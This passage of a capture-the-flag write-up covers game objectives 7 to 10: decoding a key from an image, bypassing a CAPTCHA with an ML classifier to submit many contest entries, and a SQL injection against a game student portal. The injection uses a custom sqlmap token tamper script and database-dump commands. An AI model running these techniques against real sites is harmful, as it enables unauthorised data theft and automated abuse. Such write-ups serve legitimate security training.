<pre class="src src-xml"><span style="color: #859900;">&lt;?</span><span style="color: #6c71c4;">xml</span><span style="color: #859900;"> </span><span style="color: #839496;">version="1.0" encoding="utf-8" standalone="yes"</span><span style="color: #859900;">?&gt;</span>
&lt;<span style="color: #2aa198;">cp</span>:<span style="color: #268bd2;">coreProperties</span> <span style="color: #2aa198;">xmlns</span>:<span style="color: #dc322f;">cp</span>=<span style="color: #859900;">"http://schemas.openxmlformats.org/package/2006/metadata/core-properties"</span>
<span style="color: #2aa198;">xmlns</span>:<span style="color: #dc322f;">dc</span>=<span style="color: #859900;">"http://purl.org/dc/elements/1.1/"</span>
<span style="color: #2aa198;">xmlns</span>:<span style="color: #dc322f;">dcterms</span>=<span style="color: #859900;">"http://purl.org/dc/terms/"</span>
<span style="color: #2aa198;">xmlns</span>:<span style="color: #dc322f;">dcmitype</span>=<span style="color: #859900;">"http://purl.org/dc/dcmitype/"</span>
<span style="color: #2aa198;">xmlns</span>:<span style="color: #dc322f;">xsi</span>=<span style="color: #859900;">"http://www.w3.org/2001/XMLSchema-instance"</span>&gt;
  &lt;<span style="color: #2aa198;">dc</span>:<span style="color: #268bd2;">title</span>&gt;Holiday Cheer Assignment&lt;/<span style="color: #2aa198;">dc</span>:<span style="color: #268bd2;">title</span>&gt;
  &lt;<span style="color: #2aa198;">dc</span>:<span style="color: #268bd2;">subject</span>&gt;19th Century Cheer&lt;/<span style="color: #2aa198;">dc</span>:<span style="color: #268bd2;">subject</span>&gt;
  &lt;<span style="color: #2aa198;">dc</span>:<span style="color: #268bd2;">creator</span>&gt;Bradly Buttercups&lt;/<span style="color: #2aa198;">dc</span>:<span style="color: #268bd2;">creator</span>&gt;
  &lt;<span style="color: #2aa198;">cp</span>:<span style="color: #268bd2;">keywords</span>&gt;&lt;/<span style="color: #2aa198;">cp</span>:<span style="color: #268bd2;">keywords</span>&gt;
  &lt;<span style="color: #2aa198;">dc</span>:<span style="color: #268bd2;">description</span>&gt;Kent you are so unfair. And we were going to make you the king of the Winter Carnival.&lt;/<span style="color: #2aa198;">dc</span>:<span style="color: #268bd2;">description</span>&gt;
  &lt;<span style="color: #2aa198;">cp</span>:<span style="color: #268bd2;">lastModifiedBy</span>&gt;Tim Edwards&lt;/<span style="color: #2aa198;">cp</span>:<span style="color: #268bd2;">lastModifiedBy</span>&gt;
  &lt;<span style="color: #2aa198;">cp</span>:<span style="color: #268bd2;">revision</span>&gt;4&lt;/<span style="color: #2aa198;">cp</span>:<span style="color: #268bd2;">revision</span>&gt;
  &lt;<span style="color: #2aa198;">dcterms</span>:<span style="color: #268bd2;">created</span> <span style="color: #2aa198;">xsi</span>:<span style="color: #dc322f;">type</span>=<span style="color: #859900;">"dcterms:W3CDTF"</span>&gt;2019-11-19T14:54:00Z&lt;/<span style="color: #2aa198;">dcterms</span>:<span style="color: #268bd2;">created</span>&gt;
  &lt;<span style="color: #2aa198;">dcterms</span>:<span style="color: #268bd2;">modified</span> <span style="color: #2aa198;">xsi</span>:<span style="color: #dc322f;">type</span>=<span style="color: #859900;">"dcterms:W3CDTF"</span>&gt;2019-11-19T17:50:00Z&lt;/<span style="color: #2aa198;">dcterms</span>:<span style="color: #268bd2;">modified</span>&gt;
  &lt;<span style="color: #2aa198;">cp</span>:<span style="color: #268bd2;">category</span>&gt;&lt;/<span style="color: #2aa198;">cp</span>:<span style="color: #268bd2;">category</span>&gt;
&lt;/<span style="color: #2aa198;">cp</span>:<span style="color: #268bd2;">coreProperties</span>&gt;
</pre>
</div>

<p>
With that, we find the answer to our challenge question:
</p>


<div class="figure">
<p><img src="./imgs/obj_06/solution.png" alt="solution.png" width="50%" />
</p>
<p><span class="figure-number">Figure 26: </span>"That's unfair. And we were gonna make you carnival king."</p>
</div>
</div>
</div>
</div>
<div id="outline-container-org5782da8" class="outline-3">
<h3 id="obj7"><a id="org5782da8"></a>7. Get Access To The Steam Tunnels 🎄🎄🎄</h3>
<div class="outline-text-3" id="text-obj7">
</div>
<div id="outline-container-org6cab035" class="outline-4">
<h4 id="org6cab035">Background</h4>
<div class="outline-text-4" id="text-org6cab035">
<div class="goal">
<p>
Gain access to the steam tunnels. Who took the turtle doves? Please tell us their first and last name.
</p>

</div>

<div class="chat">
<p>
Have you played with the key grinder in my room?  Check it out!
</p>

<p>
It turns out: if you have a good image of a key, you can physically copy it.
</p>

<p>
Maybe you'll see someone hopping around with a key here on campus.
</p>

<p>
<span class="underline">Sometimes you can find it in the Network tab of the browser console.</span>
</p>

<p>
Deviant has a great talk on it at this year's Con.
</p>

<p>
He even has a collection of key bitting templates for common vendors like Kwikset, Schlage, and Yale.
</p>

</div>

<div class="gamehint">
<p>
<i>For hints on achieving this objective, please visit Minty's dorm room and talk with Minty Candy Cane.</i>
</p>

<p>
<b>Key Bitting</b>: <a href="https://youtu.be/KU6FJnbkeLA">Optical Decoding of Keys</a>
</p>

<p>
<b>Bitting Templates</b>: <a href="https://github.com/deviantollam/decoding">Deviant's Key Decoding Templates</a>
</p>

</div>
</div>
</div>
<div id="outline-container-orgdf5db86" class="outline-4">
<h4 id="krampus"><a id="orgdf5db86"></a>Solution</h4>
<div class="outline-text-4" id="text-krampus">
<p>
After talking with Minty, we go to her room to check out the
grinder. Someone is jumping around, and heads into her closet. There's
a portrait of Einstein on the wall, and we suddenly feel like the eyes
are moving, and someone is watching us from behind the wall! We try to
follow the mysterious character into the closet, but they've
disappeared! We notice something strange about the back wall, and
clicking on it brings up a keyring and a Schlage lock.
</p>


<div class="figure">
<p><img src="./imgs/obj_07/krampus.png" alt="krampus.png" width="30%" />
</p>
<p><span class="figure-number">Figure 27: </span>"There's a guy in our closet."</p>
</div>

<p>
Minty gave us a hint about the Network tab of the browser
console. Turning to that now, we see our mysterious character in an
image called "Krampus." Taking a closer look, we see a key hanging on
their left side. Seems like we have a key to copy&#x2026;
</p>

<p>
We start by downloading Deviant's Schlage key template, as this
matches the lock in the closet. We crop Krampus to just the key, and
rotate it to match. We resize the image to increase the pixels per
inch, to make it a bit easier to work with.
</p>

<p>
Next, we load the template, line it up with the top and bottom of the key, and simply read off the depths:
</p>


<div class="figure">
<p><img src="./imgs/obj_07/solution.png" alt="solution.png" />
</p>
<p><span class="figure-number">Figure 28: </span>"I followed him into the closet, down into the tunnels."</p>
</div>

<p>
We use Minty's handy key-cutting machine to create this key, go into
the closet, click on the keyring to choose the key, and then put it
into the lock.
</p>


<div class="figure">
<p><img src="./imgs/obj_07/key_cutter.png" alt="key_cutter.png" width="75%" />
</p>
<p><span class="figure-number">Figure 29: </span>"But I’ve got to cut them, and that takes time."</p>
</div>

<p>
After solving this objective we gain access to the steam tunnels via our badge.  This makes getting around a lot easier.
</p>


<div class="figure">
<p><img src="./imgs/obj_07/tunnel.png" alt="tunnel.png" width="75%" />
</p>
<p><span class="figure-number">Figure 30: </span>"I’m gonna end up in a tunnel?"</p>
</div>
</div>
</div>
</div>
<div id="outline-container-orgf799065" class="outline-3">
<h3 id="obj8"><a id="orgf799065"></a>8. Bypassing the Frido Sleigh CAPTEHA 🎄🎄🎄</h3>
<div class="outline-text-3" id="text-obj8">
</div>
<div id="outline-container-org5f60a68" class="outline-4">
<h4 id="org5f60a68">Background</h4>
<div class="outline-text-4" id="text-org5f60a68">
<p>
In the tunnels behind and under Minty's completely normal closet, Krampus lays out the following challenge for us:
</p>

<div class="goal">
<p>
Bypass the CAPTEHA (elf CAPTCHA) and submit many entries in the Frito Sleigh contest
</p>

</div>

<div class="chat">
<p>
Tell you what – if you can help me beat the <a href="https://fridosleigh.com/">Frido Sleigh</a> contest (Objective 8), then I'll know I can trust you.
</p>

<p>
The contest is here on my screen and at <a href="https://fridosleigh.com">fridosleigh.com</a>.
</p>

<p>
No purchase necessary, enter as often as you want, so I am!
</p>

<p>
They set up the rules, and lately, I have come to realize that I have certain materialistic, cookie needs.
</p>

<p>
Unfortunately, it's restricted to elves only, and I can't bypass the CAPTEHA.
</p>

<p>
(That's Completely Automated Public Turing test to tell Elves and Humans Apart.)
</p>

<p>
I've already cataloged <a href="https://downloads.elfu.org/capteha_images.tar.gz">12,000 images</a> and decoded the <a href="https://downloads.elfu.org/capteha_api.py">API interface</a>.
</p>

<p>
Can you help me bypass the CAPTEHA and submit lots of entries?
</p>

</div>

<div class="gamehint">
<p>
<i>For hints on achieving this objective, please talk with Alabaster Snowball in the Speaker Unpreparedness Room.</i>
</p>

<p>
<b>Machine Learning</b>: <a href="https://youtu.be/jmVPLwjm_zs">Machine Learning Use Cases for Cyber Security</a>
</p>

</div>
</div>
</div>
<div id="outline-container-org39a3e67" class="outline-4">
<h4 id="org39a3e67">Solution</h4>
<div class="outline-text-4" id="text-org39a3e67">
<p>
We first investigate <a href="https://fridosleigh.com">https://fridosleigh.com</a> manually. The CAPTEHA
is pretty difficult, and even tricks like messing with the
client-side timer won't bypass the server-side time requirement.
</p>

<p>
Krampus has done a lot of the heavy lifting for us, in
providing us training images for our machine learning model, and
in writing a script to interact with the website. Chris Davis'
talk from Alabaster's hint walks us through the rest, and even
links us to a GitHub repo with some very useful code:
</p>


<div class="figure">
<p><img src="./imgs/obj_08/github_repo.png" alt="github_repo.png" width="66%" />
</p>
<p><span class="figure-number">Figure 31: </span>Video screenshot</p>
</div>

<p>
To complete this objective, we need to train our model with the
12,000 images provided, and then combine a script from Chris with
the script from Krampus.
</p>

<p>
To train our model, we follow the instructions in the repository
README: <code>python3 retrain.py --image_dir ./training_images/</code>. This
takes a bit of time.
</p>

<p>
In order for Krampus' script to use the prediction model, we'll
copy the necessary bits of code over. After a bit of hacking, our
script looks like this, with the following code snippets in <b>MISSING CODE&#x2026; GOES HERE</b>:
</p>

<div class="org-src-container">
<pre class="src src-python"><span style="color: #6c71c4;">import</span> base64
<span style="color: #6c71c4;">from</span> img_rec_tf_ml_demo <span style="color: #6c71c4;">import</span> predict_images_using_trained_model <span style="color: #6c71c4;">as</span> predict
<span style="color: #6c71c4;">import</span> os
<span style="color: #dc322f;">os.environ</span>[<span style="color: #859900;">'TF_CPP_MIN_LOG_LEVEL'</span>] = <span style="color: #859900;">'3'</span>
<span style="color: #6c71c4;">import</span> tensorflow <span style="color: #6c71c4;">as</span> tf
tf.logging.set_verbosity(tf.logging.ERROR)
<span style="color: #6c71c4;">import</span> numpy <span style="color: #6c71c4;">as</span> np
<span style="color: #6c71c4;">import</span> threading
<span style="color: #6c71c4;">import</span> queue
<span style="color: #6c71c4;">import</span> time
<span style="color: #6c71c4;">import</span> sys

<span style="color: #586e75;">#### </span><span style="color: #657b83;">The following is shamelessly stolen from predict_images_using_trained_model.main:</span>

<span style="color: #586e75;"># </span><span style="color: #657b83;">Loading the Trained Machine Learning Model created from running retrain.py on the training_images directory</span>
<span style="color: #dc322f;">graph</span> = predict.load_graph(<span style="color: #859900;">'/tmp/retrain_tmp/output_graph.pb'</span>)
<span style="color: #dc322f;">labels</span> = predict.load_labels(<span style="color: #859900;">"/tmp/retrain_tmp/output_labels.txt"</span>)

<span style="color: #586e75;"># </span><span style="color: #657b83;">Load up our session</span>
<span style="color: #dc322f;">input_operation</span> = graph.get_operation_by_name(<span style="color: #859900;">"import/Placeholder"</span>)
<span style="color: #dc322f;">output_operation</span> = graph.get_operation_by_name(<span style="color: #859900;">"import/final_result"</span>)
<span style="color: #dc322f;">sess</span> = tf.compat.v1.Session(graph=graph)

<span style="color: #586e75;"># </span><span style="color: #657b83;">Can use queues and threading to spead up the processing</span>
<span style="color: #dc322f;">q</span> = queue.Queue()

<span style="color: #dc322f;">yourREALemailAddress</span> = <span style="color: #859900;">"vlad@gmail.com"</span>
</pre>
</div>

<p>
This is just copying imports and load functionality from the ML script. We also make sure to provide our actual e-mail address.
</p>

<div class="org-src-container">
<pre class="src src-python"><span style="color: #586e75;">#</span><span style="color: #657b83;">Going to interate over each of our images.</span>
<span style="color: #6c71c4;">for</span> image <span style="color: #6c71c4;">in</span> b64_images:
    <span style="color: #6c71c4;">while</span> <span style="color: #2aa198;">len</span>(threading.<span style="color: #2aa198;">enumerate</span>()) &gt; 10:
        time.sleep(0.0001)

    <span style="color: #586e75;">#</span><span style="color: #657b83;">predict_image function is expecting png image bytes so we read image as 'rb' to get a bytes object</span>
    <span style="color: #dc322f;">image_bytes</span> = base64.b64decode(image[<span style="color: #859900;">'base64'</span>])
    threading.Thread(target=predict.predict_image, args=(q, sess, graph, image_bytes, image[<span style="color: #859900;">'uuid'</span>], 
                     labels, input_operation, output_operation)).start()

<span style="color: #6c71c4;">print</span>(<span style="color: #859900;">'Waiting For Threads to Finish...'</span>)
<span style="color: #6c71c4;">while</span> q.qsize() &lt; <span style="color: #2aa198;">len</span>(b64_images):
    time.sleep(0.001)

<span style="color: #586e75;">#</span><span style="color: #657b83;">getting a list of all thread-returned results</span>
<span style="color: #dc322f;">prediction_results</span> = [q.get() <span style="color: #6c71c4;">for</span> x <span style="color: #6c71c4;">in</span> <span style="color: #2aa198;">range</span>(q.qsize())]

<span style="color: #dc322f;">final_answer</span> = <span style="color: #859900;">','</span>.join([p[<span style="color: #859900;">'img_full_path'</span>] <span style="color: #6c71c4;">for</span> p <span style="color: #6c71c4;">in</span> prediction_results <span style="color: #6c71c4;">if</span> p[<span style="color: #859900;">'prediction'</span>] <span style="color: #6c71c4;">in</span> challenge_image_types])
</pre>
</div>

<p>
This is a bit more complicated than it needs to be, since we're using
threading to speed up the process. All we're doing, though, is feeding
the bytes from the image that Krampus' code downloaded to the
prediction script from the video, and then submitting the result of
the prediction.
</p>

<p>
We loop over all the images that the server sent, and then call
<code>predict_image</code> on the base64-decoded image. <code>predict_image</code> will
return the name of the image type (e.g. Stockings, Santa Hats). If the
name is the list of types the server wants us to select
(<code>challenge_image_types</code>), we add it to the list we'll be submitting.
</p>

<p>
After a bit, we're told that we won, and we receive an e-mail with our code!
</p>


<div class="figure">
<p><img src="./imgs/obj_08/email.png" alt="email.png" width="60%" />
</p>
<p><span class="figure-number">Figure 32: </span>You're a Winner!</p>
</div>
</div>
</div>
</div>
<div id="outline-container-orgcde7518" class="outline-3">
<h3 id="obj9"><a id="orgcde7518"></a>9. Retrieve Scraps of Paper from Server 🎄🎄🎄🎄</h3>
<div class="outline-text-3" id="text-obj9">
</div>
<div id="outline-container-orgc1d7428" class="outline-4">
<h4 id="orgc1d7428">Background</h4>
<div class="outline-text-4" id="text-orgc1d7428">
<div class="goal">
<p>
Gain access to the data on the <a href="https://studentportal.elfu.org/">Student Portal</a> server and retrieve the paper scraps hosted there. What is the name of Santa's cutting-edge sleigh guidance system?
</p>

</div>

<div class="chat">
<p>
Have you had any luck retrieving scraps of paper from the Elf U server?
</p>

<p>
You might want to look into SQL injection techniques.
</p>

<p>
OWASP is always a good resource for web attacks.
</p>

<p>
For blind SQLi, I've heard Sqlmap is a great tool.
</p>

<p>
In certain circumstances though, you need custom tamper scripts to get things going!
</p>

</div>

<div class="gamehint">
<p>
<i>For hints on achieving this objective, please visit the dorm and talk with Pepper Minstix.</i>
</p>

<p>
<b>SQL Injection</b>: <a href="https://www.owasp.org/index.php/SQL_Injection">SQL Injection from OWASP</a>
</p>

<p>
<b>SQLMap Tamper Scripts</b>: <a href="https://pen-testing.sans.org/blog/2017/10/13/sqlmap-tamper-scripts-for-the-win">Sqlmap Tamper Scripts</a>
</p>

</div>
</div>
</div>
<div id="outline-container-org6e2b1e0" class="outline-4">
<h4 id="org6e2b1e0">Solution</h4>
<div class="outline-text-4" id="text-org6e2b1e0">
<p>
To start, we can visit the site and submit an application to get a feel for the site. Filling in the random data and submitting it, we get a message that our application was accepted. Submitting using the same email address again, we see a message that gives us an error indicating the the email address is probably a unique key in the database.
</p>



<div class="figure">
<p><img src="./imgs/obj_09/duplicate_key.png" alt="duplicate_key.png" width="80%" />
</p>
<p><span class="figure-number">Figure 33: </span>Duplicate Email</p>
</div>

<p>
The fact that the site is displaying the failed SQL to us is a good indication it will be vulnerable to SQL injection. Using the email address again, we can also check our application status:
</p>


<div class="figure">
<p><img src="./imgs/obj_09/pending.png" alt="pending.png" width="40%" />
</p>
<p><span class="figure-number">Figure 34: </span>Application Pending</p>
</div>

<p>
Playing around a bit manually, let's try a simple injection, by finishing the SQL command <code>);</code> and commenting out the rest <code>/*</code>.
</p>


<div class="figure">
<p><img src="./imgs/obj_09/syntax-query.png" alt="syntax-query.png" width="60%" />
</p>
<p><span class="figure-number">Figure 35: </span>First SQLi attempt</p>
</div>


<div class="figure">
<p><img src="./imgs/obj_09/syntax-mariaDB.png" alt="syntax-mariaDB.png" width="60%" />
</p>
<p><span class="figure-number">Figure 36: </span>Error Shows MariaDB</p>
</div>

<p>
Well, it didn't work, however we did learn that the backend is using MariaDB. A quick Google search reveals three ways to make a valid comment. One of which is two dashes followed by a space:
</p>


<div class="figure">
<p><img src="./imgs/obj_09/count_query.png" alt="count_query.png" width="60%" />
</p>
<p><span class="figure-number">Figure 37: </span>SQLi with Correct Comment</p>
</div>


<div class="figure">
<p><img src="./imgs/obj_09/column_count.png" alt="column_count.png" width="60%" />
</p>
<p><span class="figure-number">Figure 38: </span>Error: Wrong Number of Columns</p>
</div>

<p>
Only problem now is our column count is off, any easy fix. We could add all the data we want in this field, but in this case it's easier to just submit it down below. Don't forget the added column for the application status:  
</p>


<div class="figure">
<p><img src="./imgs/obj_09/fix-columns.png" alt="fix-columns.png" width="60%" />
</p>
<p><span class="figure-number">Figure 39: </span>Correct Column Count w/ Injection</p>
</div>


<div class="figure">
<p><img src="./imgs/obj_09/duplicate.png" alt="duplicate.png" width="60%" />
</p>
<p><span class="figure-number">Figure 40: </span>Duplicate Key Again</p>
</div>

<p>
Looks like we've got a valid query again, we just hit the duplicate email address. Let's try again with a different email and also change our application status to 'accepted'.
</p>


<div class="figure">
<p><img src="./imgs/obj_09/accepted.png" alt="accepted.png" width="60%" />
</p>
<p><span class="figure-number">Figure 41: </span>Attempt to Force an Accepted Application</p>
</div>


<div class="figure">
<p><img src="./imgs/obj_09/processed.png" alt="processed.png" width="60%" />
</p>
<p><span class="figure-number">Figure 42: </span>Application Processed</p>
</div>
</div>
</div>

<div id="outline-container-org4a3f266" class="outline-4">
<h4 id="org4a3f266">SQLMAP</h4>
<div class="outline-text-4" id="text-org4a3f266">
<p>
Okay, that was fun, but it's time to get down to business. We opt to attack the application check form (since it's smaller) and by using the Network tab in our browser's console, we can view the query string parameters that is issued, and copy it as a CURL command:
</p>


<div class="figure">
<p><img src="./imgs/obj_09/params.png" alt="params.png" width="80%" />
</p>
<p><span class="figure-number">Figure 43: </span>The HTTP query parameters</p>
</div>

<p>
The parameters have the submitted elfmail field, as well as an additional one, <code>token</code>. Poking around in the source code a bit, we notice the following Javascript snippet:
</p>

<div class="org-src-container">
<pre class="src src-javascript"><span style="color: #6c71c4;">function</span> <span style="color: #268bd2;">submitApplication</span>() {
  console.log(<span style="color: #859900;">"Submitting"</span>);
  elfSign();
  document.getElementById(<span style="color: #859900;">"check"</span>).submit();
}
<span style="color: #6c71c4;">function</span> <span style="color: #268bd2;">elfSign</span>() {
  <span style="color: #6c71c4;">var</span> <span style="color: #dc322f;">s</span> = document.getElementById(<span style="color: #859900;">"token"</span>);

  <span style="color: #6c71c4;">const</span> <span style="color: #dc322f;">Http</span> = <span style="color: #6c71c4;">new</span> <span style="color: #b58900;">XMLHttpRequest</span>();
  <span style="color: #6c71c4;">const</span> <span style="color: #dc322f;">url</span>=<span style="color: #859900;">'/validator.php'</span>;
  Http.open(<span style="color: #859900;">"GET"</span>, url, <span style="color: #cb4b16;">false</span>);
  Http.send(<span style="color: #cb4b16;">null</span>);

  <span style="color: #6c71c4;">if</span> (Http.status === 200) {
    console.log(Http.responseText);
    s.value = Http.responseText;
  }

}
</pre>
</div>

<p>
Submitting the application is a two-step process: a request to <code>validator.php</code>, which returns a token, and the actual submission. Let's see if we can duplicate this behavior:
</p>

<pre class="src src-sh">
<span class="gray1">$</span> <span class="green">curl</span> -<span class="purple">s</span> https://studentportal.elfu.org/validator.php
MTAwODc1ODE5NjQ4MTU3NjE4NDY4MjEwMDg3NTgxOS42NDg=_MTI5MTIxMDQ5MTQ5NDQzMjI4MDI2MjI4LjczNg==
</pre>

<p>
That seems to match the token that was observed in the Network
traffic. However, we notice that the token changes with almost every request (likely time based).
</p>

<p>
Pepper Minstix gave us a hint to use Sqlmap, which is easy to install
(<code>brew install sqlmap</code> on MacOS). Needing the token certainly adds a wrinkle into it, though. Looking at the <a href="https://github.com/sqlmapproject/sqlmap/wiki/Usage">documentation</a>, we can identify a few options which seem useful:
</p>

<pre class="src src-sh">
-<span class="purple">u</span> URL, --<span class="purple">url</span>=URL   Target URL (e.g. "http://www.site.com/vuln.php?id=1")

--<span class="purple">eval</span>=EVALCODE     Evaluate provided Python code before the request (e.g.
                    "import hashlib;id2=hashlib.md5(id).hexdigest()")
--<span class="purple">tamper</span>=TAMPER     Use given script(s) for tampering injection data
</pre>

<p>
We can update the token parameter with every request using <code>--eval</code>. We run the following Python code:
</p>

<div class="org-src-container">
<pre class="src src-python"><span style="color: #6c71c4;">import</span> urllib3

<span style="color: #dc322f;">http</span> = urllib3.PoolManager()
<span style="color: #dc322f;">token</span>=http.request(<span style="color: #859900;">'GET'</span>,<span style="color: #859900;">'https://studentportal.elfu.orgvalidator.php'</span>).data.decode(<span style="color: #859900;">'utf-8'</span>)
</pre>
</div>

<p>
We can run it as one-liner on our <code>sqlmap</code> command with:
</p>

<pre class="src src-sh">
<span class="green">sqlmap</span> -<span class="purple">u</span> <span class="red">"https://studentportal.elfu.org/application-check.php?elfmail=mtaylor2%40lasers.com&token="</span> \
--<span class="purple">eval</span> <span class="red">"import urllib3; http=urllib3.PoolManager(); \
token=http.request('GET','https://studentportal.elfu.orgvalidator.php').data.decode('utf-8')"</span>
</pre>

<p>
However, since we were told we might need to use a tamper script we'll
proceed down that path instead. It also makes the command line a lot
easier to read. Looking through some of sqlmap's included tamper
scripts it becomes clear we'll need to write a python script that
defines a <code>tamper</code> function that passes along the current payload as
an argument. We can either put that in the normal tamper directory or
in its own directory along with an empty <code>__init__.py</code> file.
</p>

<p>
First (Failed) Attempt:
</p>
<div class="org-src-container">
<pre class="src src-python"><span style="color: #6c71c4;">import</span> urllib3

<span style="color: #6c71c4;">def</span> <span style="color: #268bd2;">tamper</span>(payload, **kwargs):
    <span style="color: #dc322f;">retVal</span> = payload
    <span style="color: #dc322f;">http</span>=urllib3.PoolManager()
    <span style="color: #dc322f;">token</span>=http.request(<span style="color: #859900;">'GET'</span>,
        <span style="color: #859900;">'https://studentportal.elfu.org/validator.php'</span>).data.decode(<span style="color: #859900;">'utf-8'</span>)

    <span style="color: #dc322f;">retVal</span> = payload + <span style="color: #859900;">'&amp;token='</span> + token
    <span style="color: #6c71c4;">return</span> retVal
</pre>
</div>

<pre class="src src-sh">
<span class="green">sqlmap</span> -<span class="purple">u</span> <span class="red">"https://studentportal.elfu.org/application-check.php?elfmail=mtaylor2%40lasers.com&token="</span> \
--<span class="purple">tamper</span> elfutamper/elfutamper.py
</pre>

<p>
Okay, this didn't work and we need to figure out why. We could setup a proxy to see what traffic sqlmap is sending, but it turns out sqlmap comes with some great verbosity options. Using <code>-v4</code> we can spot the problem:
</p>


<div class="figure">
<p><img src="./imgs/obj_09/verbose.png" alt="verbose.png" width="60%" />
</p>
<p><span class="figure-number">Figure 44: </span>SQLMAP Verbose Output</p>
</div>

<p>
The PAYLOAD looks correct, but sqlmap clearly encoded it, including our '&amp;token=' parameter. Conveniently, there's another good sqlmap option:
</p>


<pre class="src src-sh">
--<span class="purple">skip-urlencode</span>    Skip URL encoding of payload data
</pre>

<p>
There's a catch. We need to keep '&amp;token=' decoded, but encode the rest. We can handle that in our tamper script!
</p>

<div class="org-src-container">
<pre class="src src-python"><span style="color: #6c71c4;">import</span> urllib3
<span style="color: #6c71c4;">from</span> urllib.parse <span style="color: #6c71c4;">import</span> quote

<span style="color: #6c71c4;">def</span> <span style="color: #268bd2;">tamper</span>(payload, **kwargs):
    <span style="color: #dc322f;">retVal</span> = payload
    <span style="color: #dc322f;">http</span>=urllib3.PoolManager()
    <span style="color: #dc322f;">token</span>=http.request(<span style="color: #859900;">'GET'</span>,
        <span style="color: #859900;">'https://studentportal.elfu.org/validator.php'</span>).data.decode(<span style="color: #859900;">'utf-8'</span>)

    <span style="color: #dc322f;">retVal</span> = quote(payload) + <span style="color: #859900;">'&amp;token='</span> + quote(token)
    <span style="color: #6c71c4;">return</span> retVal
</pre>
</div>

<p>
Using <code>quote()</code> we specifically URL encode the payload and the token, but leave our parameter name alone. 
</p>

<p>
Our sqlmap command becomes this:
</p>

<pre class="src src-sh">
<span class="green">sqlmap</span> -<span class="purple">u</span> <span class="red">"https://studentportal.elfu.org/application-check.php?elfmail=mtaylor2%40lasers.com&token="</span> \
--<span class="purple">tamper</span> elfutamper/elfutamper.py --<span class="purple">skip-urlencode</span>
</pre>

<p>
There are a couple questions we'll need to answer (which you may have encountered already in previous attemtps):
</p>

<p>
<b>[14:10:26] [CRITICAL] heuristics detected that the target is protected by some kind of WAF/IPS
are you sure that you want to continue with further target testing? [Y/n]</b>
</p>

<p>
Y. "You bet your a** I wish to proceed." &#x2013;Theo
</p>

<p>
<b>it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n]</b>
</p>

<p>
The default 'Y' is good because there's no reason to waste time.
</p>

<p>
<b>GET parameter 'elfmail' is vulnerable. Do you want to keep testing the others (if any)? [y/N]</b>
</p>

<p>
Good news!  Our <code>elfmail</code> parameter is vulnerable, no need to continue. Sqlmap has conveniently saved this state for us, so further actions won't need to repeat the testing to find the vulnerable parameter again.
</p>

<p>
In fact, running the exact same command again just gives us the summary of our parameter and how it's vulnerable:
</p>


<div class="figure">
<p><img src="./imgs/obj_09/resume.png" alt="resume.png" width="60%" />
</p>
<p><span class="figure-number">Figure 45: </span>SQLmap Resume Details</p>
</div>
</div>
</div>

<div id="outline-container-org690460a" class="outline-4">
<h4 id="org690460a">Extracting the Database</h4>
<div class="outline-text-4" id="text-org690460a">
<p>
Using our saved state and known vulnerable parameter we can continue using sqlmap to enumerate the names of existing databases and dump the data. A couple additional few options will be used. 
</p>

<pre class="src src-sh">
  --<span class="purple">dbs</span>               Enumerate DBMS databases
  --<span class="purple">dump</span>              Dump DBMS database table entries
  -<span class="purple">D</span> DB               DBMS database to enumerate
  --<span class="purple">threads</span>=THREADS   Max number of concurrent HTTP(s) requests (default 1)
</pre>

<pre class="src src-sh">
<span class="green">sqlmap</span> -<span class="purple">u</span> <span class="red">"https://studentportal.elfu.org/application-check.php?elfmail=mtaylor2%40lasers.com&token="</span> \
--<span class="purple">tamper</span> elfutamper/elfutamper.py --<span class="purple">skip-urlencode</span> --<span class="purple">dbs</span> --<span class="purple">threads</span>=4
</pre>

<p>
The <code>--dbs</code> flag will enumerate the databases for us while <code>--threads</code> will just help make it go faster.
</p>


<div class="figure">
<p><img src="./imgs/obj_09/dbs.png" alt="dbs.png" width="60%" />
</p>
<p><span class="figure-number">Figure 46: </span>Available Databases</p>
</div>

<p>
Looks like we have two databases: elfu and information_schema.
</p>

<pre class="src src-sh">
<span class="green">sqlmap</span> -<span class="purple">u</span> <span class="red">"https://studentportal.elfu.org/application-check.php?elfmail=mtaylor2%40lasers.com&token="</span> \
--<span class="purple">tamper</span> elfutamper/elfutamper.py --<span class="purple">skip-urlencode</span> --<span class="purple">dbs</span> -<span class="purple">D</span> elfu --<span class="purple">dump</span>
</pre>

<p>
We've added <code>-D elfu</code> as the database we want to dump data from and <code>--dump</code> to take that action.
</p>


<div class="figure">
<p><img src="./imgs/obj_09/krampus.png" alt="krampus.png" width="33%" />
</p>
<p><span class="figure-number">Figure 47: </span>Krampus Table Enumeration</p>
</div>

<p>
Sqlmap spits out a lot of data as it enumerates the tables, but we caught those image names in the output. (If we had missed it, sqlmap will still store a copy in its local state.)
</p>

<p>
Those images can be directly accessed on the studentportal server:
</p>

<pre class="example">
https://studentportal.elfu.org/krampus/0f5f510e.png
https://studentportal.elfu.org/krampus/1cc7e121.png
https://studentportal.elfu.org/krampus/439f15e6.png
https://studentportal.elfu.org/krampus/667d6896.png
https://studentportal.elfu.org/krampus/adb798ca.png
https://studentportal.elfu.org/krampus/ba417715.png
</pre>


<div class="figure">
<p><img src="./imgs/obj_09/letter-fixed.png" alt="letter-fixed.png" width="60%" />
</p>
<p><span class="figure-number">Figure 48: </span>Fixed Tooth Letter</p>
</div>

<p>
Super Sled-o-matic.
</p>

<p>
We're not going to say that the background image looks like a giant tooth, but it totally does.
</p>
</div>
</div>
</div>
<div id="outline-container-org3a379fb" class="outline-3">
<h3 id="obj10"><a id="org3a379fb"></a>10. Recover Cleartext Document 🎄🎄🎄🎄🎄</h3>
<div class="outline-text-3" id="text-obj10">
</div>
<div id="outline-container-org2b7c591" class="outline-4">
<h4 id="org2b7c591">Background</h4>
<div class="outline-text-4" id="text-org2b7c591">
<p>
The <a href="https://downloads.elfu.org/elfscrow.exe">Elfscrow Crypto</a> tool is a vital asset used at Elf University for
encrypting SUPER SECRET documents. We can't send you the source, but
we do have <a href="https://downloads.elfu.org/elfscrow.pdb">debug symbols</a> that you can use.
</p>

<div class="goal">
<p>
Recover the plaintext content for this <a href="https://downloads.elfu.org/ElfUResearchLabsSuperSledOMaticQuickStartGuideV1.2.pdf.enc">encrypted document</a>. We know that it was encrypted on December 6, 2019, between 7pm and 9pm UTC.
</p>

<p>
What is the middle line on the cover page? (Hint: it's five words)
</p>

</div>

<div class="chat">
<p>
On a completely unrelated note, digital rights management can bring a hacking elf down.
</p>

<p>
That ElfScrow one can really be a hassle.
</p>

<p>
It's a good thing Ron Bowes is giving a talk on reverse engineering!
</p>

<p>
